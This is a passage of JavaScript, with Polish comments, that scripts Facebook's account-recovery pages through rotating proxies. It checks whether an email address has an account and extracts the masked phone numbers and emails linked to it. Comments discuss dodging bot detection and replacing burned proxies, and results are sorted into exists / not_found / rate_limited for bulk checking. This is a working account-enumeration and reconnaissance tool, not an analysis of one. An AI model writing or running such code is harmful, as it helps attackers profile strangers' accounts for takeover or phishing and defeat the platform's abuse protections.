                        'Referer': `${WWW_BASE}/login/identify/?ctx=recover`,
                    },
                    maxRedirects: 0,
                }
            );
            dumpDiag(email, 'www_02_post_identify', `STATUS=${r2.status}\nLOCATION=${r2.headers?.location || '-'}\n\n${String(r2.data || '').slice(0, 200000)}`);
            // 302/301 z Location: /recover/initiate/?ci=...
            if (r2.status >= 300 && r2.status < 400 && r2.headers?.location) {
                const loc = r2.headers.location;
                if (/recover\/initiate|recover\/code/i.test(loc)) {
                    recoverPath = loc.startsWith('http') ? loc : `${WWW_BASE}${loc}`;
                }
            }
            // Czasem FB zwraca 200 z <meta http-equiv="refresh" content="0;url=/recover/...">
            if (!recoverPath) {
                const m = String(r2.data || '').match(/content=["']0;url=([^"']+)/i);
                if (m && /recover/.test(m[1])) {
                    recoverPath = m[1].startsWith('http') ? m[1] : `${WWW_BASE}${m[1]}`;
                }
            }
            // Albo konto nie istnieje
            if (!recoverPath && /no account found|nie znaleziono konta|nie mogli znale/i.test(String(r2.data || ''))) {
                out.detail = 'www:not_found'; return out;
            }
        } catch (e) {
            out.detail = `www:post_identify:${String(e.message).slice(0, 60)}`; return out;
        }

        if (!recoverPath) {
            out.detail = 'www:no_recover_redirect'; return out;
        }

        // Wyciągnij ci= token z URL
        const ciMatch = recoverPath.match(/[?&]ci=([A-Za-z0-9_\-]+)/);
        const ciToken = ciMatch ? ciMatch[1] : '';
        if (!ciToken) {
            out.detail = `www:no_ci_token(url=${recoverPath.slice(0, 80)})`; return out;
        }

        // Krok 3: GET /recover/initiate/?ci= — wyciągnij nowe tokeny CSRF (strona www) oraz ewentualnie
        // bootstrap JSON z contactpoint_options (server-side render).
        let html3 = '';
        try {
            const r3 = await c.get(recoverPath, {
                timeout,
                headers: { 'Referer': `${WWW_BASE}/login/identify/` },
                maxRedirects: 5,
                validateStatus: () => true,
            });
            html3 = String(r3.data || '');
            dumpDiag(email, 'www_03_get_recover', `URL=${recoverPath}\nSTATUS=${r3.status}\n\n${html3}`);
        } catch (e) {
            dumpDiag(email, 'www_03_get_recover_ERR', String(e.stack || e.message));
            out.detail = `www:get_recover:${String(e.message).slice(0, 60)}`; return out;
        }

        // Sprawdź czy contactpoint_options jest już w server-rendered HTML
        if (/contactpoint_options/i.test(html3)) {
            const cpObj = { phones: [], emails: [], emailFound: false, hasPassword: false, accountType: '', preselected: '' };
            // L1: top-level JSON objects
            for (const obj of extractJsonObjectsLocal(html3)) {
                collectContactpointsLocal(obj, loginLower, cpObj);
            }
            // L2: substring blob
            if (!cpObj.phones.length && !cpObj.emails.length) {
                for (const obj of extractContactpointBlobsLocal(html3)) {
                    collectContactpointsLocal(obj, loginLower, cpObj);
                }
            }
            // L3: regex
            regexFallbackCp(html3, loginLower, cpObj);
            if (cpObj.phones.length || cpObj.emails.length) {
                // Harvester uzupełnia obfuscated phones z bytecode/HTML
                try {
                    for (const ph of harvestPhones(html3)) {
                        if (!cpObj.phones.includes(ph)) cpObj.phones.push(ph);
                    }
                } catch { }
                out.phones = cpObj.phones;
                out.emails = cpObj.emails;
                out.emailFound = cpObj.emailFound;
                out.hasPassword = cpObj.hasPassword;
                out.detail = `www:html_cp(phones=${cpObj.phones.length},emails=${cpObj.emails.length})`;
                return out;
            }
        }

        // Krok 4: Wyciągnij tokeny z /recover/initiate/ HTML (dla route-definition POST)
        const tokens3 = extractPageTokens(html3, '');
        if (!tokens3.lsd) {
            out.detail = 'www:no_csrf_on_recover'; return out;
        }

        // Krok 5: POST /ajax/route-definition/ z route_url=/recover/initiate/?ci=...
        const routeUrl = `/recover/initiate/?ci=${ciToken}`;
        const routeBody = new URLSearchParams();
        routeBody.set('client_previous_actor_id', '');
        routeBody.set('route_url', routeUrl);
        routeBody.set('routing_namespace', 'fb_comet');
        routeBody.set('trace_policy', 'comet.caa.account_recovery.account_search');
        routeBody.set('__aaid', '0');
        routeBody.set('__user', '0');
        routeBody.set('__a', '1');
        routeBody.set('__req', 'r');
        routeBody.set('__hs', tokens3.hs);
        routeBody.set('dpr', '1');
        routeBody.set('__ccg', 'EXCELLENT');
        routeBody.set('__rev', tokens3.rev);
        routeBody.set('__s', `${Math.random().toString(36).slice(2, 8)}:${Math.random().toString(36).slice(2, 8)}:${Math.random().toString(36).slice(2, 8)}`);
        routeBody.set('__hsi', String(Date.now()));
        routeBody.set('__dyn', tokens3.dyn);
        routeBody.set('fb_dtsg', tokens3.fbDtsg);
        routeBody.set('jazoest', tokens3.jazoest || computeJazoest(tokens3.fbDtsg));
        routeBody.set('lsd', tokens3.lsd);
        routeBody.set('__spin_r', tokens3.rev);
        routeBody.set('__spin_b', 'trunk');
        routeBody.set('__spin_t', String(Math.floor(Date.now() / 1000)));
        routeBody.set('__crn', 'comet.fbweb.CometCAAAccountSearchRoute');

        let routeRaw = '';
        try {
            const r5 = await c.post(
                `${WWW_BASE}/ajax/route-definition/`,
                routeBody.toString(),
                {
                    timeout,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'Origin': WWW_BASE,
                        'Referer': recoverPath,
                        'x-fb-lsd': tokens3.lsd,
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                    },
                    maxRedirects: 5,
                    validateStatus: () => true,
                }
            );
            routeRaw = String(r5.data || '');
            dumpDiag(email, 'www_05_route_def', `STATUS=${r5.status}\n\n${routeRaw}`);
        } catch (e) {
            dumpDiag(email, 'www_05_route_def_ERR', String(e.stack || e.message));
            out.detail = `www:route_def:${String(e.message).slice(0, 60)}`; return out;
        }

        // Zapisz do diagnostyki
        try {
            const { writeFileSync } = await import('fs');
            writeFileSync('/tmp/fb_route_def_debug.json', routeRaw.slice(0, 800_000));
        } catch { }

        if (!routeRaw || routeRaw.length < 50) {
            out.detail = 'www:route_def_empty'; return out;
        }

        // Parse response — te same 3 warstwy
        const cpObj = { phones: [], emails: [], emailFound: false, hasPassword: false, accountType: '', preselected: '' };
        for (const obj of extractJsonObjectsLocal(routeRaw)) {
            collectContactpointsLocal(obj, loginLower, cpObj);
        }
        if (!cpObj.phones.length && !cpObj.emails.length) {
            for (const obj of extractContactpointBlobsLocal(routeRaw)) {
                collectContactpointsLocal(obj, loginLower, cpObj);
            }
        }
        regexFallbackCp(routeRaw, loginLower, cpObj);

        // Uniwersalny harvester — uzupełnia phones jeśli powyższe warstwy nie złapały
        try {
            for (const ph of harvestPhones(routeRaw)) {
                if (!cpObj.phones.includes(ph)) cpObj.phones.push(ph);
            }
        } catch { }

        out.phones = cpObj.phones;
        out.emails = cpObj.emails;
        out.emailFound = cpObj.emailFound;
        out.hasPassword = cpObj.hasPassword;
        out.detail = `www:route_def(phones=${cpObj.phones.length},emails=${cpObj.emails.length},hits=${/contactpoint_options/i.test(routeRaw) ? 1 : 0})`;
        return out;

    } catch (e) {
        out.detail = `www:exc:${String(e.message).slice(0, 80)}`; return out;
    }
}

// Lokalne kopie ekstraktorów do użytku przez wwwRecoveryProbe (unikamy zależności cyklicznej)
function extractJsonObjectsLocal(txt) {
    const results = [];
    let depth = 0, start = -1, inStr = false, esc = false;
    for (let i = 0; i < txt.length; i++) {
        const c = txt[i];
        if (esc) { esc = false; continue; }
        if (c === '\\' && inStr) { esc = true; continue; }
        if (c === '"') { inStr = !inStr; continue; }
        if (inStr) continue;
        if (c === '{') { if (depth === 0) start = i; depth++; }
        else if (c === '}') {
            depth--;
            if (depth === 0 && start >= 0) {
                try { results.push(JSON.parse(txt.slice(start, i + 1))); } catch { }
                start = -1;
            }
        }
    }
    return results;
}

function extractContactpointBlobsLocal(txt) {
    const blobs = [];
    const needle = '"contactpoint_options"';
    let from = 0;
    while (true) {
        const idx = txt.indexOf(needle, from);
        if (idx < 0) break;
        from = idx + needle.length;
        let depth = 0, inStr = false, esc = false, openAt = -1;
        for (let i = idx; i >= 0; i--) {
            const c = txt[i];
            if (c === '"' && txt[i - 1] !== '\\') inStr = !inStr;
            if (inStr) continue;
            if (c === '}') depth++;
            else if (c === '{') { if (depth === 0) { openAt = i; break; } depth--; }
        }
        if (openAt < 0) continue;
        depth = 0; inStr = false; esc = false; let closeAt = -1;
        for (let i = openAt; i < txt.length; i++) {
            const c = txt[i];
            if (esc) { esc = false; continue; }
            if (c === '\\' && inStr) { esc = true; continue; }
            if (c === '"') { inStr = !inStr; continue; }
            if (inStr) continue;
            if (c === '{') depth++;
            else if (c === '}') { depth--; if (depth === 0) { closeAt = i; break; } }
        }
        if (closeAt < 0) continue;
        try { blobs.push(JSON.parse(txt.slice(openAt, closeAt + 1))); } catch { }
        from = closeAt + 1;
    }
    return blobs;
}

function collectContactpointsLocal(obj, loginLower, cpObj) {
    if (!obj || typeof obj !== 'object') return;
    if (Array.isArray(obj)) { for (const x of obj) collectContactpointsLocal(x, loginLower, cpObj); return; }
    if (Array.isArray(obj.contactpoint_options)) {
        for (const opt of obj.contactpoint_options) {
            const key = String(opt.key || '');
            const obf = String(opt.obfuscated ?? '').replace(/[\s\n\r]+/g, ' ').trim();
            if (!obf && key !== 'password') continue;
            if (key.startsWith('send_email')) {
                if (!cpObj.emails.includes(obf)) cpObj.emails.push(obf);
                if (obf.toLowerCase() === loginLower) cpObj.emailFound = true;
            } else if (key.startsWith('send_sms') || key.startsWith('send_call')) {
                if (!cpObj.phones.includes(obf)) cpObj.phones.push(obf);
            } else if (key === 'password') {
                cpObj.hasPassword = true;
            }
        }
    }
    if (obj.account_type_shown && !cpObj.accountType) cpObj.accountType = obj.account_type_shown;
    if (obj.preselected_cp && !cpObj.preselected) cpObj.preselected = obj.preselected_cp;
    for (const val of Object.values(obj)) {
        if (val && typeof val === 'object') collectContactpointsLocal(val, loginLower, cpObj);
    }
}

function regexFallbackCp(txt, loginLower, cpObj) {
    const re = /"key"\s*:\s*"([^"]+)"\s*,\s*"obfuscated"\s*:\s*"([^"]*)"/g;
    for (const m of txt.matchAll(re)) {
        const key = m[1];
        let obf = m[2].replace(/\\u0040/gi, '@').replace(/\\n/g, ' ').replace(/\\r/g, ' ').replace(/\\\//g, '/').replace(/\s+/g, ' ').trim();
        if (!obf && key !== 'password') continue;
        if (key.startsWith('send_email')) {
            if (!cpObj.emails.includes(obf)) cpObj.emails.push(obf);
            if (obf.toLowerCase() === loginLower) cpObj.emailFound = true;
        } else if (key.startsWith('send_sms') || key.startsWith('send_call')) {
            if (!cpObj.phones.includes(obf)) cpObj.phones.push(obf);
        } else if (key === 'password') {
            cpObj.hasPassword = true;
        }
    }
    const at = txt.match(/"account_type_shown"\s*:\s*"([^"]+)"/);
    if (at && !cpObj.accountType) cpObj.accountType = at[1];
    const pre = txt.match(/"preselected_cp"\s*:\s*"([^"]+)"/);
    if (pre && !cpObj.preselected) cpObj.preselected = pre[1];
}

// ────────────────────────────────────────────────────────────────────────────
// harvestPhones — UNIWERSALNY ekstraktor obfuscated numerów telefonów z dowolnej
// reprezentacji odpowiedzi FB (parsed JSON object, raw string, Bloks bytecode).
//
// Łapie wszystkie REALNE warianty zaobserwowane w odpowiedziach mbasic/m/www/Bloks:
//   • "+48 ** *** ** 23"        (klasyczny mbasic auth_method)
//   • "•• ••• 23" / "·· ··· 23" (m.facebook.com mobile UI)
//   • "+1 (***) ***-1234"       (US format)
//   • "******1234"               (krótka forma SMS)
//   • "send_sms_+48 *** 23"      (klucz Bloks contactpoint)
//   • "phone:+48***23"           (header serializacji)
//   • literalne sekwencje "\\u00b7" "\\u2022" w surowym JSON przed JSON.parse
//
// Eliminuje fałszywki:
//   • daty, IDs ("1234567890"), waterfall_id, czasy unix, bytecode constants
//   • numery bez ani jednego znaku maski (czyste cyfry)
//   • zbyt krótkie (< 4 cyfr) lub zbyt długie (> 20 znaków surowych cyfr)
//
// Zwraca tablicę unikalnych, znormalizowanych stringów numerów.
// ────────────────────────────────────────────────────────────────────────────
const PHONE_HINT_KEYS = new Set([
    'obfuscated', 'value', 'subtitle', 'display_text', 'title', 'label', 'text',
    'masked_phone', 'masked_phone_number', 'phone_number', 'phone',
    'contact_point', 'contactpoint', 'cp', 'destination',
    'localized_destination', 'masked_destination',
]);
const PHONE_HINT_CONTEXT_RX = /sms|phone|call|mobile|telefon|numer|whatsapp|msisdn|otp|recovery_phone|contact_point|contactpoint/i;
const PHONE_MASK_CHARS = /[*•·●○◦∗\u2022\u00b7\u2219xX#✱]/;
const PHONE_VALID_CHARS = /^[\s\d+\-()*•·●○◦∗\u2022\u00b7\u2219xX#✱.]+$/;

function decodePhoneEscapes(s) {
    return String(s || '')
        .replace(/\\u00b7/gi, '·')
        .replace(/\\u2022/gi, '•')
        .replace(/\\u2219/gi, '∙')
        .replace(/\\u002a/gi, '*')
        .replace(/&middot;/gi, '·')
        .replace(/&bull;/gi, '•')
        .replace(/&#x2022;/gi, '•')
        .replace(/&#8226;/gi, '•')
        .replace(/&#x00b7;/gi, '·')
        .replace(/\\n/g, ' ')
        .replace(/\\r/g, ' ')
        .replace(/\\\//g, '/');
}

function looksLikePhone(raw) {
    if (typeof raw !== 'string') return false;
    let s = decodePhoneEscapes(raw).trim();
    if (s.length < 4 || s.length > 40) return false;
    if (!PHONE_VALID_CHARS.test(s)) return false;
    // musi mieć co najmniej 1 znak maski (zamaskowane cyfry) — odsiewa surowe ID i timestampy
    if (!PHONE_MASK_CHARS.test(s)) return false;
    // musi zawierać co najmniej 2 cyfry (typowo końcówka 23 / 1234)
    const digits = s.replace(/\D/g, '');
    if (digits.length < 2) return false;
    if (digits.length > 15) return false;
    return true;
}

function normalizePhone(raw) {
    return decodePhoneEscapes(raw).replace(/[\s\n\r]+/g, ' ').trim();
}

// Skanuje *parsed* obiekt JSON — patrzy na pary klucz/wartość. Jeśli klucz
// pasuje do PHONE_HINT_KEYS lub kontekst sąsiedniego pola sugeruje SMS/phone
// (key/type/method zawiera 'sms'/'phone'/'call'), uznaje wartość za phone.
function harvestPhonesFromObject(obj, sink, ctx = '') {
    if (!obj || typeof obj !== 'object') return;
    if (Array.isArray(obj)) {
        for (const v of obj) harvestPhonesFromObject(v, sink, ctx);
        return;
    }
    // wyciągnij kontekst tej "sekcji" — jeśli jest pole key/type/method/channel,
    // jego wartość zostaje propagowana w głąb
    let localCtx = ctx;
    for (const k of ['key', 'type', 'method', 'channel', 'contact_point_type', 'cp_type', 'delivery_method']) {
        if (typeof obj[k] === 'string') localCtx = `${localCtx} ${obj[k]}`;
    }
    for (const [k, v] of Object.entries(obj)) {
        if (typeof v === 'string') {
            const isPhoneKey = PHONE_HINT_KEYS.has(k.toLowerCase());
            const ctxSaysPhone = PHONE_HINT_CONTEXT_RX.test(localCtx + ' ' + k);
            if ((isPhoneKey || ctxSaysPhone) && looksLikePhone(v)) {
                sink.add(normalizePhone(v));
            }
            // explicit FB Bloks: klucz contactpoint_options/send_sms*/send_call*
            if (/^(send_sms|send_call|send_whatsapp)/.test(String(obj.key || '')) && k === 'obfuscated' && v) {
                if (looksLikePhone(v)) sink.add(normalizePhone(v));
            }
        } else if (v && typeof v === 'object') {
            harvestPhonesFromObject(v, sink, localCtx);
        }
    }
}

// Skanuje *raw text* (Bloks bytecode, surowy JSON, HTML) — używane gdy
// JSON.parse zawiódł albo gdy phone siedzi w stringu bytecode.
function harvestPhonesFromText(txt, sink) {
    if (typeof txt !== 'string' || !txt) return;
    const decoded = decodePhoneEscapes(txt);

    // 1) Pary "klucz":"wartość" — szukamy par gdzie klucz/sąsiedztwo sugeruje phone
    //    a wartość wygląda jak zamaskowany numer.
    //    Limit 200 znaków na lookback żeby kontekst był lokalny.
    const pairRe = /"([a-z_][a-z0-9_]{2,40})"\s*:\s*"([^"]{3,40})"/gi;
    let m;
    while ((m = pairRe.exec(decoded)) !== null) {
        const key = m[1].toLowerCase();
        const val = m[2];
        if (!looksLikePhone(val)) continue;
        const isPhoneKey = PHONE_HINT_KEYS.has(key);
        if (isPhoneKey) { sink.add(normalizePhone(val)); continue; }
        // kontekst lokalny ±200 znaków
        const start = Math.max(0, m.index - 200);
        const end = Math.min(decoded.length, m.index + m[0].length + 200);
        const ctx = decoded.slice(start, end);
        if (PHONE_HINT_CONTEXT_RX.test(ctx)) sink.add(normalizePhone(val));
    }

    // 2) Bloks bytecode form: "send_sms_..." / "send_call_..." / contactpoint "send_sms+48..."
    //    Jeśli klucz Bloks zaczyna się od send_sms / send_call / send_whatsapp,
    //    następna wartość obfuscated to numer.
    const cpRe = /"key"\s*:\s*"(send_(?:sms|call|whatsapp)[^"]*)"\s*,\s*"obfuscated"\s*:\s*"([^"]*)"/g;
    while ((m = cpRe.exec(decoded)) !== null) {
        const obf = m[2];
        if (looksLikePhone(obf)) sink.add(normalizePhone(obf));
    }

    // 3) Standalone obfuscated phone tokens w bytecode — tylko gdy obok jest słowo
    //    sms/phone/call (max 80 znaków). Bardzo restrykcyjnie aby nie łapać śmieci.
    //    Pozwala na końcówkę typu "99 12" (cyfra spacja cyfra) — częsty PL format.
    const standaloneRe = /(?:"|>|\s)(\+?[\d]{0,4}[\s\-()]{0,3}[*•·●○◦∗\u2022\u00b7\u2219xX#✱]{2,}[\s\d*•·●○◦∗\u2022\u00b7\u2219xX#✱\-()]{2,}\d(?:[\s\-]\d{1,4})?)(?="|<|,)/g;
    while ((m = standaloneRe.exec(decoded)) !== null) {
        const cand = m[1];
        if (!looksLikePhone(cand)) continue;
        const start = Math.max(0, m.index - 80);
        const end = Math.min(decoded.length, m.index + m[0].length + 80);
        const ctx = decoded.slice(start, end);
        if (PHONE_HINT_CONTEXT_RX.test(ctx)) sink.add(normalizePhone(cand));
    }

    // 4) Bloks bytecode podwójnie escape'owany: "send_sms_xxx",\"+48 ** *** 99 12\"
    //    (tablice argumentów bk.action.* gdzie wartości są nested-escaped strings).
    //    Pattern: klucz send_(sms|call|whatsapp)_* a potem najbliższy string-literal
    //    z maską i cyframi (max 200 znaków odstępu).
    const bloksKeyRe = /send_(?:sms|call|whatsapp)_[A-Za-z0-9_+\-]*/g;
    while ((m = bloksKeyRe.exec(decoded)) !== null) {
        const tail = decoded.slice(m.index + m[0].length, m.index + m[0].length + 200);
        // Kolejny string w cudzysłowach (z escape lub bez) — wystarczy łapać cokolwiek
        // między " ... " co zawiera maskę i cyfry.
        const nextStr = tail.match(/[\\"']?([+\d][\d\s+\-()*•·●○◦∗\u2022\u00b7\u2219xX#✱]{4,40}\d)[\\"']?/);
        if (nextStr && looksLikePhone(nextStr[1])) sink.add(normalizePhone(nextStr[1]));
    }
}

/**
 * Universal phone harvester.
 *
 * @param {*} input - Może być: parsed object/array, JSON string, raw bytecode/HTML,
 *                   axios response.data, lub mieszanka. Tolerancyjny na wszystko.
 * @returns {string[]} - Tablica unikalnych, znormalizowanych obfuscated numerów.
 */
export function harvestPhones(input) {
    const sink = new Set();
    const visit = (x) => {
        if (x == null) return;
        if (typeof x === 'string') {
            // Może to być sam JSON dump — spróbuj sparsować
            const trimmed = x.trim();
            if ((trimmed.startsWith('{') || trimmed.startsWith('[')) && trimmed.length > 2) {
                try { visit(JSON.parse(trimmed)); } catch { }
            }
            harvestPhonesFromText(x, sink);
            return;
        }
        if (typeof x === 'object') {
            harvestPhonesFromObject(x, sink);
            // dodatkowo serializuj i skanuj jako tekst — łapie bytecode strings
            // które są wartościami głębokich pól
            try { harvestPhonesFromText(JSON.stringify(x), sink); } catch { }
        }
    };
    visit(input);
    return [...sink];
}


export async function httpProbe(email, proxyUrl, opts = {}) {
    const timeout = opts.timeout ?? 20000;
    const out = {
        decision: 'transport_error',
        detail: '',
        phones: [],
        emails: [],
        redirectUri: '',
        codeLen: null,
        active: 'no',
    };

    let client;
    try { client = makeClient(proxyUrl, timeout, { session: opts.session }); }
    catch (e) { out.detail = `agent:${e.message}`; return out; }
    const { c, jar } = client;
    if (opts.session) opts.session.jobs++;

    // Krok 1: GET strony identify — wyciągnij tokeny CSRF i Bloks
    let html = '', pageUrl = `${BLOKS_BASE}/login/identify/?ctx=recover`;
    try {
        let cur = pageUrl;
        for (let hop = 0; hop < 5; hop++) {
            const res = await c.get(cur, { timeout });
            html = String(res.data || '');
            if (res.status >= 300 && res.status < 400 && res.headers?.location) {
                cur = new URL(res.headers.location, cur).toString();
                continue;
            }
            pageUrl = cur;
            break;
        }
    } catch (e) {
        out.detail = `get_page:${String(e.message).slice(0, 60)}`; return out;
    }

    if (/sorry.*went wrong|your request couldn|co[śs] posz[łl]o nie tak|ta strona nie jest|page isn.*t available|this page isn/i.test(html)) {
        out.detail = 'identify:session_error'; return out;
    }
    if (/temporarily blocked|too many attempts|try again later|tymczasowo zablokow|zbyt wiele pr[oó]b/i.test(html)) {
        out.decision = 'rate_limited'; out.detail = 'identify:rate_limited'; return out;
    }

    // Wyciągnij datr z cookies (używane jako device_id w Bloks)
    const cookieStr = await jar.getCookieString(BLOKS_BASE);
    const datr = cookieStr.match(/\bdatr=([A-Za-z0-9_-]+)/)?.[1] || '';
    const tokens = extractPageTokens(html, datr);

    if (!tokens.lsd && !tokens.fbDtsg) {
        // Strona nie zwróciła tokenów CSRF — zapisz HTML do diagnostyki
        try { (await import('node:fs')).writeFileSync('/tmp/fb_get_debug.html', html.slice(0, 200_000)); } catch { }
        out.decision = 'rate_limited'; out.detail = 'no_csrf_tokens'; return out;
    }

    // Krok 2: POST search.async — wyślij email do FB
    const waterfallId0 = uuid4();
    const searchParamsJson = JSON.stringify({
        server_params: {
            event_request_id: uuid4(),
            device_id: null,
            family_device_id: null,
            waterfall_id: waterfallId0,
            offline_experiment_group: null,
            layered_homepage_experiment_group: null,
            is_platform_login: 0,
            is_from_logged_in_switcher: 0,
            is_from_logged_out: 0,
            access_flow_version: 'pre_mt_behavior',
            login_surface: 'unknown',
            context_data: null,
        },
        client_input_params: {
            search_query: email,
            fetched_email_list: [],
            fetched_email_token_list: {},
            sso_accounts_auth_data: [],
            sfdid: '',
            text_input_id: '1lxfp5:62',
            encrypted_msisdn: '',
            headers_infra_flow_id: '',
            was_headers_prefill_available: 0,
            was_headers_prefill_used: 0,
            ig_oauth_token: [],
            android_build_type: '',
            is_whatsapp_installed: 0,
            device_network_info: null,
            accounts_list: [],
            is_oauth_without_permission: 0,
            search_screen_type: 'mobile',
            ig_vetted_device_nonce: '',
            gms_incoming_call_retriever_eligibility: 'client_not_supported',
            auth_secure_device_id: '',
            blocked_uids: [],
            cloud_trust_token: null,
            network_bssid: null,
            lois_settings: { lois_token: '' },
            aac: '',
        },
    });

    await new Promise(r => setTimeout(r, 100 + Math.random() * 300));

    const bloksHeaders = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Origin': BLOKS_BASE,
        'Referer': pageUrl,
        'x-fb-lsd': tokens.lsd,
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
    };

    let searchRes;
    try {
        searchRes = await c.post(
            `${BLOKS_BASE}/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.search.async&type=action&__bkv=${tokens.bkv}`,
            buildBloksBody(tokens, searchParamsJson).toString(),
            { headers: bloksHeaders, timeout }
        );
    } catch (e) {
        out.detail = `search_async:${String(e.message).slice(0, 60)}`; return out;
    }

    const searchData = parseBloksJson(searchRes.data);
    if (!searchData) {
        const raw = String(searchRes.data || '');
        if (/temporarily blocked|too many/i.test(raw)) { out.decision = 'rate_limited'; out.detail = 'search:rate_limited'; }
        else { out.detail = `search_async:bad_json(${searchRes.status})`; }
        return out;
    }

    // DEBUG: zapisz search.async response
    try { const { writeFileSync } = await import('fs'); writeFileSync('/tmp/fb_search_debug.json', JSON.stringify(searchData, null, 2).slice(0, 60000)); } catch { }

    const sr = extractSearchResult(searchData);
    if (sr.notFound) { out.decision = 'not_found'; out.detail = 'bloks:not_found'; return out; }

    // Konto nie zostało potwierdzone jako istniejące (brak account_type_shown, brak controllers)
    if (!sr.accountExists) {
        const strings = collectStrings(searchData);
        if (strings.some(s => /too many|temporarily|rate.?limit/i.test(s))) {
            out.decision = 'rate_limited'; out.detail = 'bloks:rate_limited'; return out;
        }
        // ⚠ Brak sygnałów istnienia ALE też brak twardego sygnału not_found.
        // To NIE jest dowód że konto nie istnieje — to znaczy "nie wiem".
        // Realne przyczyny pustego bytecode:
        //   1) FB wykrył bota i zwrócił okrojony bytecode
        //   2) Spalone/shadowbanowane proxy
        //   3) Meta dodała nowy controller którego heurystyka nie zna
        // Wybieramy retry z innym proxy zamiast fałszywego BAD.
        try {
            const { writeFileSync, mkdirSync } = await import('fs');
            mkdirSync('/tmp/fb_no_signal', { recursive: true });
            const safe = String(email).replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 60);
            writeFileSync(`/tmp/fb_no_signal/${safe}_${Date.now()}.json`,
                JSON.stringify({ wf: sr.waterfallId, screen: sr.screenId, type: sr.accountType, next: sr.nextScreen, raw: searchData }, null, 2).slice(0, 80000));
        } catch { }
        out.decision = 'transport_error';
        out.detail = `bloks:no_account_signal(wf=${sr.waterfallId || '-'},next=${sr.nextScreen || '-'})`;
        return out;
    }

    // Wybierz dostępny token kontekstu — preferuj nową metę (caa_core_data_encrypted)
    const contextToken = sr.coreDataEncrypted || sr.contextData;
    if (!contextToken) {
        out.detail = `bloks:no_context_token(wf=${sr.waterfallId || '-'},type=${sr.accountType || '?'})`;
        out.decision = 'rate_limited';  // retry — może transient
        return out;
    }

    out.redirectUri = `bloks:${sr.waterfallId}`;
    const deviceId = sr.deviceId || datr;
    const useNewMeta = !!sr.coreDataEncrypted;

    // Helper: zbuduj server_params dla kolejnych ekranów CAA AR (dziedziczone po search.async)
    const buildArServerParams = (extra = {}) => {
        const p = {
            device_id: deviceId,
            waterfall_id: sr.waterfallId,
            is_platform_login: false,
            is_from_logged_out: false,
            access_flow_version: sr.accessFlowVersion,
            login_surface: 'account_recovery',
            login_entry_point: 'account_recovery',
            back_nav_action: 'BACK',
            INTERNAL_INFRA_screen_id: sr.screenId,
            ...extra,
        };
        if (useNewMeta) {
            p.caa_core_data_encrypted = sr.coreDataEncrypted;
            p.account_type_shown = sr.accountType || null;
        } else {
            p.context_data = sr.contextData;
        }
        return p;
    };

    // Helper: POST do dowolnego appid CAA AR i zwrot sparsowanego JSON
    const postCaa = async (appid, serverParamsExtra = {}, clientInput = {}) => {
        const paramsJson = JSON.stringify({
            server_params: buildArServerParams(serverParamsExtra),
            client_input_params: {
                lois_settings: { lois_token: '' },
                machine_id: '',
                zero_balance_state: '',
                aac: '',
                ...clientInput,
            },
        });
        let res;
        try {
            res = await c.post(
                `${BLOKS_BASE}/async/wbloks/fetch/?appid=${appid}&type=app&__bkv=${tokens.bkv}`,
                buildBloksBody(tokens, paramsJson).toString(),
                { headers: bloksHeaders, timeout }
            );
        } catch (e) {
            return { err: `${appid}:${String(e.message).slice(0, 60)}` };
        }
        const json = parseBloksJson(res.data);
        if (!json) return { err: `${appid}:bad_json(${res.status})` };
        return { json, status: res.status };
    };

    // Krok 3: POST com.bloks.www.caa.ar.code_entry — to jest faktyczny ekran "Wybierz sposob logowania"
    // (z attachmentu usera ss2: WhatsApp/SMS/FB notif/haslo + zamaskowane numery/emaile).
    // Endpoint auth_method jest deprecated w 2026 - bytecode search.async wskazuje od razu code_entry.
    let recovery = null;
    let recoveryFromAppid = '';
    let recoveryRaw = null;

    const ce = await postCaa('com.bloks.www.caa.ar.code_entry');
    if (ce.err) { out.detail = ce.err; return out; }
    recoveryRaw = ce.json;
    recovery = parseAuthOptions(ce.json, email);
    recoveryFromAppid = 'code_entry';

    // DEBUG: zapisz code_entry response
    try {
        const { writeFileSync } = await import('fs');
        writeFileSync('/tmp/fb_code_entry_debug.json', JSON.stringify(ce.json, null, 2).slice(0, 200000));
    } catch { }

    // Jesli code_entry zwraca single-method screen (np. tylko haslo, jak ss1) lub error_screen,
    // sprobuj try_another_way / auth_method jako fallback - to symuluje klikniecie
    // "Sprobuj uzyc innej metody" w ss1 -> przejscie do ss2 z pelna lista.
    const needsAlt = !recovery || recovery.isErrorPage ||
        (recovery.phones.length === 0 && recovery.emails.length === 0);
    if (needsAlt) {
        for (const altAppid of [
            'com.bloks.www.caa.ar.try_another_way',
            'com.bloks.www.caa.ar.alt_methods',
            'com.bloks.www.caa.ar.auth_method',
        ]) {
            const alt = await postCaa(altAppid);
            // Diag dump ZAWSZE — niezależnie od err/isErrorPage żeby zobaczyć co FB zwraca
            const altShort = altAppid.replace('com.bloks.www.caa.ar.', '');
            dumpDiag(email, `bloks_alt_${altShort}`, alt.json ? JSON.stringify(alt.json, null, 2) : (alt.err || 'no_response'));
            if (alt.err || !alt.json) continue;
            const altRec = parseAuthOptions(alt.json, email);
            if (!altRec || altRec.isErrorPage) continue;
            if (altRec.phones.length > 0 || altRec.emails.length > 0 || altRec.hasPassword) {
                recovery = altRec;
                recoveryRaw = alt.json;
                recoveryFromAppid = altShort;
                try {
                    const { writeFileSync } = await import('fs');
                    writeFileSync(`/tmp/fb_${recoveryFromAppid}_debug.json`, JSON.stringify(alt.json, null, 2).slice(0, 200000));
                } catch { }
                break;
            }
        }
    }

    if (!recovery) { out.decision = 'not_found'; out.detail = 'bloks:recovery_not_found'; return out; }

    if (recovery.isErrorPage) {
        // Wszystkie screeny zwrocily "strona niedostepna". Skoro search.async potwierdzilo istnienie,
        // klasyfikuj jako EXISTS bez listy kanalow (FB ich nie pokaze bez pelnej sesji).
        if (sr.accountType || sr.nextScreen === 'code_entry' || sr.nextScreen === 'auth_method') {
            out.decision = 'exists';
            out.codeLen = '6';
            out.detail = `bloks:exists_no_recovery_options(type=${sr.accountType || '?'},next=${sr.nextScreen || '-'})`;
            return out;
        }
        out.decision = 'rate_limited'; out.detail = 'bloks:all_screens_error'; return out;
    }

    out.phones = recovery.phones;
    out.emails = recovery.emails;
